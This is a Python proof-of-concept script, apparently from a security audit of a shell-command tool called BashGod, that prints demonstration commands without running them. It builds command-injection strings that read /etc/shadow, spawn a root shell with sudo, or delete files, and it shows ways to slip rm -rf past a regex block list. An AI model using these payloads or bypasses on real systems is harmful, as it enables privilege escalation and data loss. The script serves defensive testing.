#!/usr/bin/env python3
"""
AGENT 6 - Security Vulnerability Demonstration
Proof-of-concept demonstrations for identified security vulnerabilities.

WARNING: This script contains exploit demonstrations for educational purposes only.
DO NOT USE against systems without explicit authorization.
"""

import asyncio
import json
import logging
import os
import re
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, List, Any

logger = logging.getLogger('SecurityDemo')

class VulnerabilityDemonstrator:
    """Demonstrates security vulnerabilities in a safe, controlled manner"""
    
    def __init__(self):
        self.demo_results = []
        
    async def demonstrate_command_injection(self) -> Dict[str, Any]:
        """Demonstrate command injection vulnerability BASH-001"""
        print("\n" + "="*60)
        print("DEMONSTRATION: Command Injection via Parameter Substitution")
        print("Vulnerability ID: BASH-001")
        print("="*60)
        
        # Simulate the vulnerable parameter substitution
        def vulnerable_prepare_command(template: str, params: Dict[str, str]) -> str:
            """Simulates the vulnerable _prepare_command method"""
            cmd = template
            for placeholder, value in params.items():
                cmd = cmd.replace(f"{{{placeholder}}}", value)
            return cmd
        
        # Test cases demonstrating the vulnerability
        test_cases = [
            {
                "name": "Basic Command Injection",
                "template": "ls {path}",
                "params": {"path": "/tmp; echo 'INJECTED COMMAND EXECUTED'; echo"},
                "description": "Semicolon injection allows execution of arbitrary commands"
            },
            {
                "name": "Destructive Command Chain",
                "template": "cat {file}",
                "params": {"file": "/etc/passwd; rm -rf /tmp/test_file; echo 'FILE DELETED'"},
                "description": "Command chaining can execute destructive operations"
            },
            {
                "name": "Privilege Escalation Attempt",
                "template": "echo {value} > {file}",
                "params": {
                    "value": "test", 
                    "file": "/tmp/test; sudo whoami; echo 'PRIVILEGE CHECK'"
                },
                "description": "Injection can attempt privilege escalation"
            },
            {
                "name": "Environment Variable Injection",
                "template": "export {var}={value} && echo 'Set variable'",
                "params": {
                    "var": "TEST",
                    "value": "safe; export MALICIOUS=injected; echo 'ENV POISONED'"
                },
                "description": "Environment variable poisoning through injection"
            }
        ]
        
        results = []
        for test in test_cases:
            print(f"\nTest: {test['name']}")
            print(f"Description: {test['description']}")
            
            # Generate the vulnerable command
            vulnerable_cmd = vulnerable_prepare_command(test['template'], test['params'])
            print(f"Original template: {test['template']}")
            print(f"Malicious params: {test['params']}")
            print(f"Resulting command: {vulnerable_cmd}")
            
            # Highlight the injected portion
            injected_parts = []
            for param_val in test['params'].values():
                if ';' in param_val or '&&' in param_val or '||' in param_val:
                    injected_parts.append(param_val)
            
            if injected_parts:
                print(f"🚨 INJECTION DETECTED: {injected_parts}")
                print("   This would execute unintended commands!")
            
            results.append({
                "test_name": test['name'],
                "template": test['template'],
                "params": test['params'],
                "vulnerable_command": vulnerable_cmd,
                "injection_detected": len(injected_parts) > 0,
                "injected_content": injected_parts
            })
        
        return {
            "vulnerability": "BASH-001",
            "title": "Command Injection via Parameter Substitution",
            "severity": "CRITICAL",
            "test_results": results
        }
    
    async def demonstrate_sudo_injection(self) -> Dict[str, Any]:
        """Demonstrate sudo injection vulnerability BASH-004"""
        print("\n" + "="*60)
        print("DEMONSTRATION: Sudo Command Injection")
        print("Vulnerability ID: BASH-004")
        print("="*60)
        
        # Simulate vulnerable sudo commands from BashGod
        vulnerable_sudo_commands = [
            {
                "name": "CPU State Control",
                "template": "echo {mode} | sudo tee /sys/devices/system/cpu/amd_pstate/status",
                "malicious_param": "performance; sudo /bin/bash; echo hidden",
                "description": "Inject shell execution in CPU control command"
            },
            {
                "name": "Memory Cache Control", 
                "template": "sync && echo {level} | sudo tee /proc/sys/vm/drop_caches && free -h",
                "malicious_param": "3; sudo whoami; echo 'ROOT ACCESS'",
                "description": "Privilege escalation through memory command"
            },
            {
                "name": "Kernel Parameter",
                "template": "echo {value} | sudo tee /proc/sys/kernel/speculation_control",
                "malicious_param": "1; sudo cat /etc/shadow | head -1; echo 'SHADOW ACCESSED'",
                "description": "Access sensitive files through kernel parameter injection"
            }
        ]
        
        results = []
        for cmd in vulnerable_sudo_commands:
            print(f"\nTest: {cmd['name']}")
            print(f"Description: {cmd['description']}")
            
            # Show the vulnerable command construction
            vulnerable_cmd = cmd['template'].replace('{mode}', cmd['malicious_param'])
            vulnerable_cmd = vulnerable_cmd.replace('{level}', cmd['malicious_param'])
            vulnerable_cmd = vulnerable_cmd.replace('{value}', cmd['malicious_param'])
            
            print(f"Template: {cmd['template']}")
            print(f"Malicious parameter: {cmd['malicious_param']}")
            print(f"Resulting command: {vulnerable_cmd}")
            
            # Analyze the injection
            if 'sudo' in cmd['malicious_param']:
                print("🚨 SUDO INJECTION: Additional sudo commands detected!")
                print("   This could escalate privileges beyond intended scope!")
            
            if '/etc/shadow' in cmd['malicious_param'] or '/etc/passwd' in cmd['malicious_param']:
                print("🔐 SENSITIVE FILE ACCESS: Attempting to access system files!")
            
            results.append({
                "command_name": cmd['name'],
                "template": cmd['template'],
                "malicious_param": cmd['malicious_param'],
                "vulnerable_command": vulnerable_cmd,
                "sudo_injection": 'sudo' in cmd['malicious_param'],
                "sensitive_file_access": any(f in cmd['malicious_param'] for f in ['/etc/shadow', '/etc/passwd'])
            })
        
        return {
            "vulnerability": "BASH-004",
            "title": "Sudo Command Injection",
            "severity": "CRITICAL",
            "test_results": results
        }
    
    async def demonstrate_pattern_bypass(self) -> Dict[str, Any]:
        """Demonstrate security pattern bypass BASH-003"""
        print("\n" + "="*60)
        print("DEMONSTRATION: Security Pattern Bypass")
        print("Vulnerability ID: BASH-003")
        print("="*60)
        
        # Current security patterns from BashGod
        dangerous_patterns = [
            r'rm\s+-rf\s+/',
            r';\s*rm\s+-rf',
            r'&&\s*rm\s+-rf',
            r'\|\|\s*rm\s+-rf',
        ]
        
        # Bypass techniques
        bypass_techniques = [
            {
                "name": "Variable Substitution Bypass",
                "pattern_target": r'rm\s+-rf\s+/',
                "original_blocked": "rm -rf /",
                "bypass_command": "rm${IFS}-rf${IFS}/",
                "technique": "Use $IFS (Internal Field Separator) variable"
            },
            {
                "name": "Multiple Space Bypass",
                "pattern_target": r'rm\s+-rf\s+/',
                "original_blocked": "rm -rf /",
                "bypass_command": "rm  -rf  /",
                "technique": "Multiple spaces to evade single \\s pattern"
            },
            {
                "name": "Separated Flag Bypass",
                "pattern_target": r'rm\s+-rf\s+/',
                "original_blocked": "rm -rf /",
                "bypass_command": "rm -r -f /",
                "technique": "Separate combined flags"
            },
            {
                "name": "Command Substitution Bypass",
                "pattern_target": r';\s*rm\s+-rf',
                "original_blocked": "ls; rm -rf /tmp",
                "bypass_command": "ls $(echo ';') rm -rf /tmp",
                "technique": "Use command substitution to hide semicolon"
            },
            {
                "name": "Backtick Bypass",
                "pattern_target": r';\s*rm\s+-rf',
                "original_blocked": "ls; rm -rf /tmp",
                "bypass_command": "ls `echo ';'` rm -rf /tmp",
                "technique": "Use backticks for command substitution"
            },
            {
                "name": "ANSI-C Quoting Bypass",
                "pattern_target": r';\s*rm\s+-rf', 
                "original_blocked": "ls; rm -rf /tmp",
                "bypass_command": "ls $'\\n' rm -rf /tmp",
                "technique": "Use ANSI-C quoting with newline"
            }
        ]
        
        results = []
        for bypass in bypass_techniques:
            print(f"\nBypass Test: {bypass['name']}")
            print(f"Target pattern: {bypass['pattern_target']}")
            print(f"Original (blocked): {bypass['original_blocked']}")
            print(f"Bypass command: {bypass['bypass_command']}")
            print(f"Technique: {bypass['technique']}")
            
            # Test if bypass evades detection
            pattern_matched = False
            for pattern in dangerous_patterns:
                if re.search(pattern, bypass['bypass_command'], re.IGNORECASE):
                    pattern_matched = True
                    break
            
            if not pattern_matched:
                print("✅ BYPASS SUCCESSFUL: Pattern detection evaded!")
            else:
                print("❌ BYPASS FAILED: Still detected by pattern")
            
            results.append({
                "bypass_name": bypass['name'],
                "target_pattern": bypass['pattern_target'],
                "original_command": bypass['original_blocked'],
                "bypass_command": bypass['bypass_command'],
                "technique": bypass['technique'],
                "bypass_successful": not pattern_matched
            })
        
        return {
            "vulnerability": "BASH-003",
            "title": "Security Pattern Bypass",
            "severity": "HIGH",
            "test_results": results
        }
    
    async def demonstrate_htm_vulnerabilities(self) -> Dict[str, Any]:
        """Demonstrate HTM storage vulnerabilities"""
        print("\n" + "="*60)
        print("DEMONSTRATION: HTM Storage Security Issues")
        print("Vulnerabilities: CBC-001, CBC-005")
        print("="*60)
        
        # Simulate unencrypted HTM storage
        print("\n1. Unencrypted Storage Demonstration (CBC-001)")
        print("-" * 50)
        
        # Example of sensitive data that would be stored in plain text
        sensitive_embedding_data = {
            "id": "uuid-12345",
            "embedding_vector": [0.1, 0.2, 0.3, "...", "768 dimensions"],
            "file_path": "/proprietary/secret_algorithm.py",
            "semantic_tags": ["authentication", "crypto", "password_hash"],
            "dependencies": ["internal_crypto_lib", "secret_key_manager"],
            "complexity_score": 9.8,
            "metadata": {
                "project": "TOP_SECRET_PROJECT",
                "author": "john.doe@company.com",
                "classification": "CONFIDENTIAL"
            }
        }
        
        print("Example of sensitive data stored in plain text:")
        print(json.dumps(sensitive_embedding_data, indent=2))
        print("\n🚨 SECURITY ISSUE: This data is stored without encryption!")
        print("   Attackers with file system access can read:")
        print("   - Proprietary code embeddings")
        print("   - Internal file paths and structure")
        print("   - Project metadata and classifications")
        
        # Simulate missing API authentication
        print("\n2. Missing API Authentication Demonstration (CBC-005)")
        print("-" * 50)
        
        api_endpoints = [
            {
                "endpoint": "CrawlDirectory",
                "description": "Crawl any directory without authorization",
                "risk": "Unauthorized file system access"
            },
            {
                "endpoint": "QueryByResonance", 
                "description": "Query sensitive embeddings without authentication",
                "risk": "Data exfiltration and IP theft"
            },
            {
                "endpoint": "ExecuteTool",
                "description": "Execute any tool without permission check",
                "risk": "Arbitrary tool execution"
            },
            {
                "endpoint": "StoreEmbedding",
                "description": "Store malicious embeddings without validation",
                "risk": "Data poisoning attacks"
            }
        ]
        
        print("Vulnerable API endpoints (no authentication required):")
        for endpoint in api_endpoints:
            print(f"  • {endpoint['endpoint']}: {endpoint['description']}")
            print(f"    Risk: {endpoint['risk']}")
        
        print("\n🚨 SECURITY ISSUE: Any network client can:")
        print("   - Access all system functions")
        print("   - Query and exfiltrate sensitive data")
        print("   - Execute tools without authorization")
        print("   - Poison the embedding database")
        
        return {
            "vulnerabilities": ["CBC-001", "CBC-005"],
            "title": "HTM Storage and API Security Issues",
            "severity": "CRITICAL/HIGH",
            "storage_vulnerability": {
                "issue": "Unencrypted storage",
                "sensitive_data_example": sensitive_embedding_data,
                "impact": "Information disclosure and IP theft"
            },
            "api_vulnerability": {
                "issue": "Missing authentication",
                "vulnerable_endpoints": api_endpoints,
                "impact": "Complete unauthorized system access"
            }
        }
    
    async def run_all_demonstrations(self) -> Dict[str, Any]:
        """Run all vulnerability demonstrations"""
        print("🔍 SECURITY VULNERABILITY DEMONSTRATION SUITE")
        print("=" * 80)
        print("WARNING: Educational/demonstration purposes only!")
        print("=" * 80)
        
        results = {}
        
        # Run all demonstrations
        results['command_injection'] = await self.demonstrate_command_injection()
        results['sudo_injection'] = await self.demonstrate_sudo_injection()
        results['pattern_bypass'] = await self.demonstrate_pattern_bypass()
        results['htm_vulnerabilities'] = await self.demonstrate_htm_vulnerabilities()
        
        # Summary
        print("\n" + "="*80)
        print("DEMONSTRATION SUMMARY")
        print("="*80)
        
        total_vulns = 0
        critical_vulns = 0
        high_vulns = 0
        
        for category, result in results.items():
            if isinstance(result.get('severity'), str):
                if 'CRITICAL' in result['severity']:
                    critical_vulns += 1
                elif 'HIGH' in result['severity']:
                    high_vulns += 1
                total_vulns += 1
            
        print(f"Total vulnerabilities demonstrated: {total_vulns}")
        print(f"Critical severity: {critical_vulns}")
        print(f"High severity: {high_vulns}")
        
        print("\nKey findings:")
        print("• Command injection possible through parameter substitution")
        print("• Sudo operations vulnerable to privilege escalation")
        print("• Security patterns can be bypassed with various techniques")
        print("• HTM storage lacks encryption for sensitive data")
        print("• API endpoints have no authentication requirements")
        
        print("\n⚠️  RECOMMENDATION: Address all critical vulnerabilities before deployment!")
        
        return {
            "demonstration_summary": {
                "total_vulnerabilities": total_vulns,
                "critical_count": critical_vulns,
                "high_count": high_vulns,
                "timestamp": "2025-06-08T22:11:50Z"
            },
            "detailed_results": results
        }

async def main():
    """Main demonstration function"""
    demonstrator = VulnerabilityDemonstrator()
    
    try:
        results = await demonstrator.run_all_demonstrations()
        
        # Save results
        with open('security_vulnerability_demonstrations.json', 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        print(f"\nDetailed results saved to: security_vulnerability_demonstrations.json")
        
        return results
        
    except Exception as e:
        logger.error(f"Demonstration failed: {e}")
        raise

if __name__ == "__main__":
    asyncio.run(main())